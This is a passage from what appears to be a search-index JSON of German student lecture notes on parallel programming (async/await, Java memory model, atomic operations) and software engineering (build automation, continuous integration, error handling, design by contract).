            "text": "Eine  async -Methode l\u00e4uft teilweise asynchron, teilweise synchron  Aufrufer f\u00fchrt die Methode erst asynchron aus, sobald ein  await  kommt, vorher synchron  Der asynchrone Teil wird normalerweise durch den Thread des erwarteten Tasks ausgef\u00fchrt (als \"continuation\")  Ausser  bei UI-Threads: Dort wird der Asynchrone Teil nach dem  await  wider vom Aufrufer (= UI-Thread) ausgef\u00fchrt  Somit hat dies die gleiche Auswirkung wie ohne dem async / await Konzept, die Aufteilung wird einfach vom Compiler gemacht", 
            "title": "Ausf\u00fchrungsmodell"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#ui-programmierung", 
            "text": "async   void   startDownload_Click ( \u2026 )   { \n     HttpClient   client   =   new   HttpClient (); \n     foreach   ( var   url   in   collection )   { \n         var   data   =   await   client . GetStringAsync ( url ); \n         textArea . Content   +=   data ; \n     }  }    Die Methode springt zur\u00fcck beim  await , das Resultat wird dann wieder im GUI-Thread gesetzt", 
            "title": "UI-Programmierung"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#pitfalls", 
            "text": "Eine  async -Methode sind nicht per-se asynchron. Ist kein  await  drin ist, wird sie komplett synchron ausgef\u00fchrt  Workaround:  return await Task.Run()    Threadwechsel w\u00e4hrend Methodenausf\u00fchrung  Teil nach  await  muss nicht mehr im gleichen Thread ausgef\u00fchrt werden    Empfehlung: Nur im UI-Layer benutzen", 
            "title": "Pitfalls"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/", 
            "text": "Memory Models\n\n\nQuiz letzte Vorlesung\n\n\n\n\nInvalidOperationException\n, wenn w\u00e4hrend dem Download ein Element in die Collection eingef\u00fcgt wird\n\n\nawait\n haltet die Schleife an und kann den Thread wechseln. W\u00e4hrenddessen kann das UI die Collection \u00e4ndern\n\n\n\n\nZiel\n\n\n\n\nKorrekte nebenl\u00e4ufige Interaktion\n\n\nGarantien ds Speichermodell nutzen\n\n\nEffiziente Synchronisation, skalierbar\n\n\n\n\nProbleme\n\n\n\n\nUmordnung: Optimizer kann Code-Ablauf nicht-deterministisch \u00e4ndern, wenn zwei Statements unabh\u00e4ngig voneinander sind (\"Weak Consistency\")\n\n\nKeine sequentielle Konsistenz bei Nebenl\u00e4ufigkeit\n\n\n\n\nJava Memory Model\n\n\nAtomicity\n\n\n\n\nUnteilbarkeit\n\n\nGarantiert einzelnes atomares Lesen und Schreiben f\u00fcr Primitive Datentypen (bis 32 Bit), Objekt-Referenzen und \nvolatile\n long und double\n\n\nUnteilbarkeit heisst nicht Sichtbarkeit: Nach einem Write kann ein Thread noch den alten Wert sehen  \n\n\n\n\nVisibility\n\n\n\n\nWenn ein Thread eine Variable setzt, ist es nicht garantiert, dass ein anderer den neuen Wert sieht\n\n\nKann nicht-deterministisch nach gewisser Zeit oder gar nie sichtbar werden\n\n\nOptimizer l\u00e4dt evtl. Variable in ein Register, dass dann gar nie geupdated wird\n\n\nOptimizer beachtet nur die Ausf\u00fchrung in einem Thread\n\n\n\n\n\n\n\n\nGarantien\n\n\n\n\nSichtbar bei Locks (sonst w\u00fcrde das ganze Lock-System nicht funktionieren)\n\n\nvolatile\n Variablen sind f\u00fcr andere Zugreifer immer sichtbar\n\n\nVor dem \nvolatile\n-Zugriff werden alle \u00c4nderungen(auch von nicht-volatile-Variablen!) f\u00fcr andere sichtbar, die auch auf diese Variable zugreifen \n\n\nBesser explizite Synchronisation einsetzen\n\n\nOrdnung ist vor und nach dem volatile-Zugriff garantiert, wie ein \"Memory-Fence\"\n\n\n\n\n\n\nfinal\n-Variablen nach Initialisierung im Constructor: \"Initialized State\" ist sichtbar\n\n\nThread-Start / Join, bzw. Task Start und Ende\n\n\n\n\nOrdering\n\n\n\n\nInnerhalb eines Threads wird alles sequentiell ausgef\u00fchrt\n\n\nZwischen Threads ist die Reihenfolge nur erhalten f\u00fcr Synchronisationsbefehle und Zugriff auf volatile-Varialben\n\n\n\"Memory Fence\": Keine Umordnung \u00fcber Synchronisation oder Volatile-Zugriffe hinweg\n\n\n\n\nAtomare Operationen\n\n\n\n\nEffiziente, atomare Instruktion des Prozessors\n\n\nKomplexer als Lesen / Schreiben\n\n\n\n\nAtomic Boolean\n\n\n\n\nKann mit \ngetAndSet()\n atomar alten Wert lesen und neuen Wert setzen\n\n\ncompareAndSet()\n: Atomares lesen und setzen mit Condition\n\n\nWenn Variable expected Wert hat, wird neuer Wert gesezt und \ntrue\n returned\n\n\n\n\n\n\nAtomic Klassen gibt es auch f\u00fcr Integer, Long und Referenzen\n\n\n\n\nOptimisitsche Synchronisation\n\n\n\n\nIn einer Schleife wird versucht, den Wert zu aktualisieren\n\n\nalten Wert zwischenspeichern und versuchen zu Updaten, bis der Wert nicht nicht zwischendrin ver\u00e4ndert wurde\n\n\nNachteile: \n\n\nTheoretische Starvation-M\u00f6glichkeit\n\n\nZwischen\u00e4nderungen werden nicht erkannt (ABA-Problem)\n\n\n\n\n\n\nConcurrent Lockfreie Datenstrukturen sind meistens so implementiert\n\n\n\n\n.NET\n\n\n\n\nTODO", 
            "title": "9 Memory Models"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#memory-models", 
            "text": "", 
            "title": "Memory Models"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#quiz-letzte-vorlesung", 
            "text": "InvalidOperationException , wenn w\u00e4hrend dem Download ein Element in die Collection eingef\u00fcgt wird  await  haltet die Schleife an und kann den Thread wechseln. W\u00e4hrenddessen kann das UI die Collection \u00e4ndern", 
            "title": "Quiz letzte Vorlesung"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#ziel", 
            "text": "Korrekte nebenl\u00e4ufige Interaktion  Garantien ds Speichermodell nutzen  Effiziente Synchronisation, skalierbar", 
            "title": "Ziel"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#probleme", 
            "text": "Umordnung: Optimizer kann Code-Ablauf nicht-deterministisch \u00e4ndern, wenn zwei Statements unabh\u00e4ngig voneinander sind (\"Weak Consistency\")  Keine sequentielle Konsistenz bei Nebenl\u00e4ufigkeit", 
            "title": "Probleme"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#java-memory-model", 
            "text": "", 
            "title": "Java Memory Model"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#atomicity", 
            "text": "Unteilbarkeit  Garantiert einzelnes atomares Lesen und Schreiben f\u00fcr Primitive Datentypen (bis 32 Bit), Objekt-Referenzen und  volatile  long und double  Unteilbarkeit heisst nicht Sichtbarkeit: Nach einem Write kann ein Thread noch den alten Wert sehen", 
            "title": "Atomicity"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#visibility", 
            "text": "Wenn ein Thread eine Variable setzt, ist es nicht garantiert, dass ein anderer den neuen Wert sieht  Kann nicht-deterministisch nach gewisser Zeit oder gar nie sichtbar werden  Optimizer l\u00e4dt evtl. Variable in ein Register, dass dann gar nie geupdated wird  Optimizer beachtet nur die Ausf\u00fchrung in einem Thread", 
            "title": "Visibility"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#garantien", 
            "text": "Sichtbar bei Locks (sonst w\u00fcrde das ganze Lock-System nicht funktionieren)  volatile  Variablen sind f\u00fcr andere Zugreifer immer sichtbar  Vor dem  volatile -Zugriff werden alle \u00c4nderungen(auch von nicht-volatile-Variablen!) f\u00fcr andere sichtbar, die auch auf diese Variable zugreifen   Besser explizite Synchronisation einsetzen  Ordnung ist vor und nach dem volatile-Zugriff garantiert, wie ein \"Memory-Fence\"    final -Variablen nach Initialisierung im Constructor: \"Initialized State\" ist sichtbar  Thread-Start / Join, bzw. Task Start und Ende", 
            "title": "Garantien"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#ordering", 
            "text": "Innerhalb eines Threads wird alles sequentiell ausgef\u00fchrt  Zwischen Threads ist die Reihenfolge nur erhalten f\u00fcr Synchronisationsbefehle und Zugriff auf volatile-Varialben  \"Memory Fence\": Keine Umordnung \u00fcber Synchronisation oder Volatile-Zugriffe hinweg", 
            "title": "Ordering"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#atomare-operationen", 
            "text": "Effiziente, atomare Instruktion des Prozessors  Komplexer als Lesen / Schreiben", 
            "title": "Atomare Operationen"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#atomic-boolean", 
            "text": "Kann mit  getAndSet()  atomar alten Wert lesen und neuen Wert setzen  compareAndSet() : Atomares lesen und setzen mit Condition  Wenn Variable expected Wert hat, wird neuer Wert gesezt und  true  returned    Atomic Klassen gibt es auch f\u00fcr Integer, Long und Referenzen", 
            "title": "Atomic Boolean"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#optimisitsche-synchronisation", 
            "text": "In einer Schleife wird versucht, den Wert zu aktualisieren  alten Wert zwischenspeichern und versuchen zu Updaten, bis der Wert nicht nicht zwischendrin ver\u00e4ndert wurde  Nachteile:   Theoretische Starvation-M\u00f6glichkeit  Zwischen\u00e4nderungen werden nicht erkannt (ABA-Problem)    Concurrent Lockfreie Datenstrukturen sind meistens so implementiert", 
            "title": "Optimisitsche Synchronisation"
        }, 
        {
            "location": "/ParProg/9_Memory_Models/#net", 
            "text": "TODO", 
            "title": ".NET"
        }, 
        {
            "location": "/PhAI/0_Index/", 
            "text": "Physik Anwendungen f\u00fcr Informatik\n\n\n\n\nExam Notes", 
            "title": "0 Index"
        }, 
        {
            "location": "/PhAI/0_Index/#physik-anwendungen-fur-informatik", 
            "text": "Exam Notes", 
            "title": "Physik Anwendungen f\u00fcr Informatik"
        }, 
        {
            "location": "/PhAI/1_Exam/", 
            "text": "Some exam notes...", 
            "title": "1 Exam"
        }, 
        {
            "location": "/SE2/0_Index/", 
            "text": "Software Engineering 2\n\n\n\n\nExam Notes\n\n\nProject Automation\n\n\nSoftware Engineering Practises\n\n\nError Handling Design\n\n\nDesign by Contract", 
            "title": "0 Index"
        }, 
        {
            "location": "/SE2/0_Index/#software-engineering-2", 
            "text": "Exam Notes  Project Automation  Software Engineering Practises  Error Handling Design  Design by Contract", 
            "title": "Software Engineering 2"
        }, 
        {
            "location": "/SE2/1_Exam/", 
            "text": "Some exam notes...", 
            "title": "1 Exam"
        }, 
        {
            "location": "/SE2/2_Project_Automation/", 
            "text": "Note\n\n\nkontakt: mmeili\n\n\n\n\nLeitsatz: \"Automate everything you need to do more than once\"\n\n\nIdee: Build-Script\n\n\n\n\nPro\n\n\nCompile, unit test, package, integration test, deploy automatisiert\n\n\nWiederholbar\n\n\ncan automatisch scheduled werden\n\n\n\n\n\n\nCon\n\n\nnon-interactive process, man kann nicht eingreifen\n\n\nMaintenace und Erweiterung ist m\u00fchsam\n\n\nMeist platform-abh\u00e4ngig (Batch, bash)\n\n\n\n\n\n\n\n\nZiele\n\n\n\n\nCRISP\n\n\nComplete: Jeder Build wird von neu auf aufgebaut\n\n\nRepeatable: Wiederverwendbar, auch mit \u00e4lteren Versionen\n\n\nInformative: Feedback \u00fcber den Prozess, z.B. Testresultate\n\n\nSchedulable\n\n\nPortable: Nicht nur auf lokaler Maschine ausf\u00fchrbar\n\n\n\n\n\n\nFlexibilit\u00e4t: Indiviuelle Tasks ausf\u00fchren\n\n\n\n\nBuild Tools\n\n\nImperative Build Tools\n\n\n\n\nMake-Familie: Den DA-Graphen wird explizit definiert (Abh\u00e4ngigkeiten)\n\n\nPros\n\n\nSehr flexibel und m\u00e4chtig\n\n\n\n\n\n\nCons\n\n\nKomplexe Definitionen\n\n\nSchwierig wiederzuverwenden\n\n\nViel copy-paste\n\n\n\n\n\n\n\n\nDeclarative Build Tools\n\n\n\n\nz.B. Maven, Gradle\n\n\nDeklarativ: Wie soll das Ergebnis aussehen?\n\n\nConvention over Configuration (nur konfigurieren, was nicht default ist)\n\n\nProjekt-Struktur ist meist default vorgegeben\n\n\nresources-Verzeichnis ist read-only!\n\n\n\n\n\n\nPros\n\n\nK\u00fcrzere files\n\n\nWiederverwendbare Logik\n\n\nDependeny Management\n\n\n\n\n\n\nCons\n\n\nWeniger flexibel\n\n\nStrenge Projektstruktur\n\n\n\n\n\n\n\n\nContinuous Integration\n\n\n\n\nMaintain a single source repository\n\n\nAutomate the build\n\n\nMake the build self-testing\n\n\nEveryone commits to the mainline every day\n\n\nEvery commit to the mainline should be built\n\n\nKeep the build fast\n\n\nTest in a clone of the production environment\n\n\nMake it easy to get the latest deliverables\n\n\nEveryone can see what\u2019s happening\n\n\nAutomate deployment", 
            "title": "2 Project Automation"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#idee-build-script", 
            "text": "Pro  Compile, unit test, package, integration test, deploy automatisiert  Wiederholbar  can automatisch scheduled werden    Con  non-interactive process, man kann nicht eingreifen  Maintenace und Erweiterung ist m\u00fchsam  Meist platform-abh\u00e4ngig (Batch, bash)", 
            "title": "Idee: Build-Script"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#ziele", 
            "text": "CRISP  Complete: Jeder Build wird von neu auf aufgebaut  Repeatable: Wiederverwendbar, auch mit \u00e4lteren Versionen  Informative: Feedback \u00fcber den Prozess, z.B. Testresultate  Schedulable  Portable: Nicht nur auf lokaler Maschine ausf\u00fchrbar    Flexibilit\u00e4t: Indiviuelle Tasks ausf\u00fchren", 
            "title": "Ziele"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#build-tools", 
            "text": "", 
            "title": "Build Tools"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#imperative-build-tools", 
            "text": "Make-Familie: Den DA-Graphen wird explizit definiert (Abh\u00e4ngigkeiten)  Pros  Sehr flexibel und m\u00e4chtig    Cons  Komplexe Definitionen  Schwierig wiederzuverwenden  Viel copy-paste", 
            "title": "Imperative Build Tools"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#declarative-build-tools", 
            "text": "z.B. Maven, Gradle  Deklarativ: Wie soll das Ergebnis aussehen?  Convention over Configuration (nur konfigurieren, was nicht default ist)  Projekt-Struktur ist meist default vorgegeben  resources-Verzeichnis ist read-only!    Pros  K\u00fcrzere files  Wiederverwendbare Logik  Dependeny Management    Cons  Weniger flexibel  Strenge Projektstruktur", 
            "title": "Declarative Build Tools"
        }, 
        {
            "location": "/SE2/2_Project_Automation/#continuous-integration", 
            "text": "Maintain a single source repository  Automate the build  Make the build self-testing  Everyone commits to the mainline every day  Every commit to the mainline should be built  Keep the build fast  Test in a clone of the production environment  Make it easy to get the latest deliverables  Everyone can see what\u2019s happening  Automate deployment", 
            "title": "Continuous Integration"
        }, 
        {
            "location": "/SE2/3_SE_Practises/", 
            "text": "Software Engineering Practices\n\n\nRequirements Practises\n\n\nDig for Requirements\n\n\n\n\nMit dem Kunden zusammen arbeiten\n\n\nDenken aus Benutzersicht\n\n\n\"W\u00fcnsche\" von echten Anforderungen trennen\n\n\nGr\u00fcnde hinterfragen\n\n\n\n\n\n\nGen\u00fcgend abstrakt definieren, Details k\u00f6nnen schnell \u00e4ndern\n\n\nWenn zu genau spezifiziert, werden sie genau so implementiert und sind nicht erweiterbar\n\n\n\n\n\n\n\n\nMake Quality a Requirement\n\n\n\n\nQualit\u00e4t als NF-Anforderungen\n\n\nM\u00f6glichst testbar machen\n\n\nBasierend auf echten Anforderungen von Benuzter-Bed\u00fcrfnissen\n\n\nSind schwieriger zu ermitteln, oft unter-/un- bewusst\n\n\nErmittlungstechniken\n\n\nChecklisten (Brainstorming)\n\n\nBefragen, Beobachten\n\n\n\n\n\n\nGrosser Einfluss auf Architekturentscheidungen\n\n\nevtl. Referenzsystem festlegen f\u00fcr Performance-Tests\n\n\n\n\nDeal with Changes\n\n\n\n\nEs gibt keine \"stabilen\" Requirements\n\n\nM\u00f6glichst flexibles Design\n\n\n\n\nDesign Practises\n\n\nDRY\n\n\n\n\nCode-Redundanz ist schlecht, nicht wartbar\n\n\nAuch in Code-Doku redundante Beschreibungen vermeiden\n\n\n\n\nAchieve Orthogonality\n\n\n\n\n\"Eliminate effects between unrelated things\"\n\n\nKeine Kopplung zwischen konzeptionell unabh\u00e4ngiger Konzepte\n\n\nLow Coupling / High Cohesion\n\n\nArchitektur sollte keine Zyklen haben (DAG)\n\n\nSonst schwer auszutauschen\n\n\nKeine Wiederverwendbarkeit\n\n\nNicht sauber testbar\n\n\n\n\n\n\n\n\nDesign to Test\n\n\n\n\nVor Entwicklungszeit betrachten, da es Architetktur beeinflusst\n\n\n\n\nImplementation Practises\n\n\nFix broken Windows\n\n\n\n\n\"Broken Window Syndrom\": Wenn Probleme nicht behoben werden, bleiben sie bestehen\n\n\nProbleme beheben, wenn sie entstehen\n\n\nRefactoring / Code Reviews\n\n\n\n\nRefactor early and often\n\n\n\n\nRefactoring als Prozess definieren\n\n\nGute Tests for Refactoring haben, um nicht Fehler einzubauen\n\n\n\n\nProgram Deliberately\n\n\n\n\nNicht auf \"gut Gl\u00fcck\" programmieren\n\n\nSpezifikation lesen (vor allem bei Paral. Progr.)\n\n\n\n\nVerification Practises\n\n\nTest rigorously\n\n\n\n\nfr\u00fch, h\u00e4ufig, automatisch testen\n\n\n\"Find Issues Once\": F\u00fcr gefundene Fehler Tests schreiben\n\n\nIntegration Tests genauso wichtig wie Unit Tests\n\n\n\n\nPerform Reviews", 
            "title": "3 SE Practises"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#software-engineering-practices", 
            "text": "", 
            "title": "Software Engineering Practices"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#requirements-practises", 
            "text": "", 
            "title": "Requirements Practises"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#dig-for-requirements", 
            "text": "Mit dem Kunden zusammen arbeiten  Denken aus Benutzersicht  \"W\u00fcnsche\" von echten Anforderungen trennen  Gr\u00fcnde hinterfragen    Gen\u00fcgend abstrakt definieren, Details k\u00f6nnen schnell \u00e4ndern  Wenn zu genau spezifiziert, werden sie genau so implementiert und sind nicht erweiterbar", 
            "title": "Dig for Requirements"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#make-quality-a-requirement", 
            "text": "Qualit\u00e4t als NF-Anforderungen  M\u00f6glichst testbar machen  Basierend auf echten Anforderungen von Benuzter-Bed\u00fcrfnissen  Sind schwieriger zu ermitteln, oft unter-/un- bewusst  Ermittlungstechniken  Checklisten (Brainstorming)  Befragen, Beobachten    Grosser Einfluss auf Architekturentscheidungen  evtl. Referenzsystem festlegen f\u00fcr Performance-Tests", 
            "title": "Make Quality a Requirement"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#deal-with-changes", 
            "text": "Es gibt keine \"stabilen\" Requirements  M\u00f6glichst flexibles Design", 
            "title": "Deal with Changes"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#design-practises", 
            "text": "", 
            "title": "Design Practises"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#dry", 
            "text": "Code-Redundanz ist schlecht, nicht wartbar  Auch in Code-Doku redundante Beschreibungen vermeiden", 
            "title": "DRY"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#achieve-orthogonality", 
            "text": "\"Eliminate effects between unrelated things\"  Keine Kopplung zwischen konzeptionell unabh\u00e4ngiger Konzepte  Low Coupling / High Cohesion  Architektur sollte keine Zyklen haben (DAG)  Sonst schwer auszutauschen  Keine Wiederverwendbarkeit  Nicht sauber testbar", 
            "title": "Achieve Orthogonality"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#design-to-test", 
            "text": "Vor Entwicklungszeit betrachten, da es Architetktur beeinflusst", 
            "title": "Design to Test"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#implementation-practises", 
            "text": "", 
            "title": "Implementation Practises"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#fix-broken-windows", 
            "text": "\"Broken Window Syndrom\": Wenn Probleme nicht behoben werden, bleiben sie bestehen  Probleme beheben, wenn sie entstehen  Refactoring / Code Reviews", 
            "title": "Fix broken Windows"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#refactor-early-and-often", 
            "text": "Refactoring als Prozess definieren  Gute Tests for Refactoring haben, um nicht Fehler einzubauen", 
            "title": "Refactor early and often"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#program-deliberately", 
            "text": "Nicht auf \"gut Gl\u00fcck\" programmieren  Spezifikation lesen (vor allem bei Paral. Progr.)", 
            "title": "Program Deliberately"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#verification-practises", 
            "text": "", 
            "title": "Verification Practises"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#test-rigorously", 
            "text": "fr\u00fch, h\u00e4ufig, automatisch testen  \"Find Issues Once\": F\u00fcr gefundene Fehler Tests schreiben  Integration Tests genauso wichtig wie Unit Tests", 
            "title": "Test rigorously"
        }, 
        {
            "location": "/SE2/3_SE_Practises/#perform-reviews", 
            "text": "", 
            "title": "Perform Reviews"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/", 
            "text": "Error Handling Design\n\n\nMassnahmen f\u00fcr Fehler-Vermdeidung\n\n\n\n\nTesting / Simulation\n\n\nStatische Analyse\n\n\nArchitektur (-Review)\n\n\nDeliberate Programming\n\n\nReviews\n\n\n\n\nDefensive Programmierung\n\n\nSystematische Fehlerpr\u00fcfung\n\n\n\n\nAlle Werte von externen Quellen werden gepr\u00fcft\n\n\nUng\u00fcltige Zust\u00e4nde werden behandelt\n\n\nSystematisch abfangen\n\n\nz.B. Default case bei \nswitch\n\n\n\n\n\n\nUng\u00fcltige Benutzer-Eingaben verhindern\n\n\nPr\u00fcfung von Funktions-Input\n\n\nPreconditions vor Ausf\u00fchrung pr\u00fcfen\n\n\n\n\n\n\nNachteile\n\n\nKann u.U. nicht getestet werden\n\n\nKostet etwas (mehr Programmieraufwand, mehr Laufzeit)\n\n\nDuplizierter Code\n\n\n\n\n\n\n\n\nFehler-Barrikaden\n\n\n\n\nExterne Eingaben sind zuerst \"untrusted\" und m\u00fcssen durch eine Barrikade gehen, wo sie getestet werden\n\n\nPrecondition muss so nicht bei jeder Methode gepr\u00fcft werden, sondern nur einmal\n\n\nImplementation\n\n\nz.B. \u00fcber eine Facade nur g\u00fcltige Daten \"rein lassen\"\n\n\nDatacontracts, wenn z.B. eine Konfiguration eingelesen wird\n\n\nPublic-Methods \u00fcberpr\u00fcfen Daten, private Methods gehen von g\u00fcltigen Daten aus\n\n\n\n\n\n\n\n\nSystematische Fehlerbehandlung\n\n\n\n\nFehler erkennen und melden\n\n\nH\u00e4ngt stark vom System ab, ein Auto z.B. kann bei Fehler nicht einfach weiter fahren\n\n\nSicherheitskritische Systeme sollten bei einem Fehler in einen sicheren Zustand\n\n\nNicht-sicherheitskritische Systeme sollten Fehler loggen und robust sein bei Fehler, dh. versuchen am Laufen zu halten\n\n\nKonservative Behandlung\n\n\nFehlermeldung anzeigen\n\n\nShutdown\n\n\n\n\n\n\nOptimistische Behandlung\n\n\nNeutrales Resultat\n\n\nN\u00e4chstm\u00f6glich plausibles Resultat w\u00e4hlen\n\n\nWarnung loggen\n\n\n\n\n\n\nlokale\n Behandlung\n\n\nNur f\u00fcr erwarteten Fall, wenn Fall lokal abschliessend entscheidbar ist\n\n\nIn java checked exceptions\n\n\n\n\n\n\nglobale\n Behandlung\n\n\nWenn nicht lokal behandelbar\n\n\nFehler ist auf h\u00f6herer Ebene relevant\n\n\nIn Java unchecked (Runtime) Exceptions (z.B. NullPointerException), da es \u00fcberall passieren k\u00f6nnte\n\n\nIn Java kann ein global Error Handler definiert werden, der z.B. alle Exceptions loggt\n\n\n\n\n\n\nFehlerbehandlung kann auch Fehler enthalten!\n\n\nEinfach halten\n\n\nebenfalls testen\n\n\n\n\n\n\n\n\nAssertions\n\n\n\n\nLogisch dassselbe wie \nif.. else throw\n\n\nKann von der Runtime an- oder abgeschaltet werden, z.B. f\u00fcr Debug-Umgebung\n\n\nF\u00fcr produktive F\u00e4lle wie externe Quellen immer Exceptions verwenden!\n\n\nAssertions f\u00fcr Programmierfehler verwenden, die nie auftreten d\u00fcrfen\n\n\nSicher sein, dass sie immer wahr sind! Quasi als formale Kommentare\n\n\nz.B. wenn man bereits weiss, dass Preconditions erf\u00fcllt sind\n\n\nKein Ausf\u00fchrbarer code, bzw. keine Seiteneffekte! Assertions werden nicht immer ausgef\u00fchrt\n\n\n\n\n\n\nF\u00fcr Tests assertions abschalten, wenn sie in der Produktion auch disabled sind", 
            "title": "4 Error Handling Design"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#error-handling-design", 
            "text": "", 
            "title": "Error Handling Design"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#massnahmen-fur-fehler-vermdeidung", 
            "text": "Testing / Simulation  Statische Analyse  Architektur (-Review)  Deliberate Programming  Reviews", 
            "title": "Massnahmen f\u00fcr Fehler-Vermdeidung"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#defensive-programmierung", 
            "text": "", 
            "title": "Defensive Programmierung"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#systematische-fehlerprufung", 
            "text": "Alle Werte von externen Quellen werden gepr\u00fcft  Ung\u00fcltige Zust\u00e4nde werden behandelt  Systematisch abfangen  z.B. Default case bei  switch    Ung\u00fcltige Benutzer-Eingaben verhindern  Pr\u00fcfung von Funktions-Input  Preconditions vor Ausf\u00fchrung pr\u00fcfen    Nachteile  Kann u.U. nicht getestet werden  Kostet etwas (mehr Programmieraufwand, mehr Laufzeit)  Duplizierter Code", 
            "title": "Systematische Fehlerpr\u00fcfung"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#fehler-barrikaden", 
            "text": "Externe Eingaben sind zuerst \"untrusted\" und m\u00fcssen durch eine Barrikade gehen, wo sie getestet werden  Precondition muss so nicht bei jeder Methode gepr\u00fcft werden, sondern nur einmal  Implementation  z.B. \u00fcber eine Facade nur g\u00fcltige Daten \"rein lassen\"  Datacontracts, wenn z.B. eine Konfiguration eingelesen wird  Public-Methods \u00fcberpr\u00fcfen Daten, private Methods gehen von g\u00fcltigen Daten aus", 
            "title": "Fehler-Barrikaden"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#systematische-fehlerbehandlung", 
            "text": "Fehler erkennen und melden  H\u00e4ngt stark vom System ab, ein Auto z.B. kann bei Fehler nicht einfach weiter fahren  Sicherheitskritische Systeme sollten bei einem Fehler in einen sicheren Zustand  Nicht-sicherheitskritische Systeme sollten Fehler loggen und robust sein bei Fehler, dh. versuchen am Laufen zu halten  Konservative Behandlung  Fehlermeldung anzeigen  Shutdown    Optimistische Behandlung  Neutrales Resultat  N\u00e4chstm\u00f6glich plausibles Resultat w\u00e4hlen  Warnung loggen    lokale  Behandlung  Nur f\u00fcr erwarteten Fall, wenn Fall lokal abschliessend entscheidbar ist  In java checked exceptions    globale  Behandlung  Wenn nicht lokal behandelbar  Fehler ist auf h\u00f6herer Ebene relevant  In Java unchecked (Runtime) Exceptions (z.B. NullPointerException), da es \u00fcberall passieren k\u00f6nnte  In Java kann ein global Error Handler definiert werden, der z.B. alle Exceptions loggt    Fehlerbehandlung kann auch Fehler enthalten!  Einfach halten  ebenfalls testen", 
            "title": "Systematische Fehlerbehandlung"
        }, 
        {
            "location": "/SE2/4_Error_Handling_Design/#assertions", 
            "text": "Logisch dassselbe wie  if.. else throw  Kann von der Runtime an- oder abgeschaltet werden, z.B. f\u00fcr Debug-Umgebung  F\u00fcr produktive F\u00e4lle wie externe Quellen immer Exceptions verwenden!  Assertions f\u00fcr Programmierfehler verwenden, die nie auftreten d\u00fcrfen  Sicher sein, dass sie immer wahr sind! Quasi als formale Kommentare  z.B. wenn man bereits weiss, dass Preconditions erf\u00fcllt sind  Kein Ausf\u00fchrbarer code, bzw. keine Seiteneffekte! Assertions werden nicht immer ausgef\u00fchrt    F\u00fcr Tests assertions abschalten, wenn sie in der Produktion auch disabled sind", 
            "title": "Assertions"
        }, 
        {
            "location": "/SE2/5_Design_by_Contract/", 
            "text": "Design by Contract\n\n\n\n\nContracts legen Rechte (benefits) und Pflichten (obligations) zwischen zweier Parteien in einem formalen Dokument fest\n\n\nDesign by Contract will dieses Prinzip auf SW anwenden\n\n\nBeziehungn zwischen \"Kunden und Lieferanten\", zwischen zwei Komponenten, werden durch Vertr\u00e4ge geregelt\n\n\nKomponenten k\u00f6nnen Systeme oder Subsysteme (z.B. Klassen) sein\n\n\nEinf\u00fchrung Konzept von Eiffel\n\n\n\n\nPre-/Post-Conditons\n\n\n\n\nPreconditions\n: Bedingungen, die vor dem Aufruf einer Methode gelten (bei Klasse). Der Aufrufer ist daf\u00fcr verantwortlich\n\n\nPostconditions\n: Bedingungen, die nach dem Aufruf g\u00fcltig sind, verantwortlich ist die konkrete Implementation\n\n\n\n\nKlasseninvarianten\n: Garantien f\u00fcr einen Aufrufer, welche Eigenschaften vor / nach jedem Methodenaufruf gelten\n\n\n\n\noder: Allgemeing\u00fcltige Postconditions f\u00fcr alle Methoden in einer Klasse\n\n\n\n\n\n\n\n\nPre- und Postconditions werden nur auf der \"supplier\"-Seite definiert, also dem \"Callee\"\n\n\n\n\nGrund: Kontext des Aufrufers ist verschieden, beim Supplier aber immer gleich\n\n\n\n\n\n\n\n\nIn Eiffel werden Pre-conditions im \nrequire\n-Block, Post-conditions im \nensure\n-Block definiert\n\n\n\n\n\n\nDer defensive Ansatz pr\u00fcft die Pre-conditon in der Methode\n\n\n\n\nDer Ansatz von \nDesign by contract\n geht davon aus, dass die Pre- und Post-conditions \nerf\u00fcllt\n sind, ohne sie explizit zu pr\u00fcfen\n\n\nPre- und postconditions d\u00fcrfen Zust\u00e4nde des Systems abfragen, aber nicht ver\u00e4ndern!\n\n\n\n\nVollst\u00e4ndigkeit\n\n\n\n\nMan kann eine Klasse nur auf ihren internen Zustand pr\u00fcfen\n\n\nWenn z.B. eine Klasse eine Referenz auf eine andere Klasse hat, kann man nicht die internen Eigenschaften der Klasse 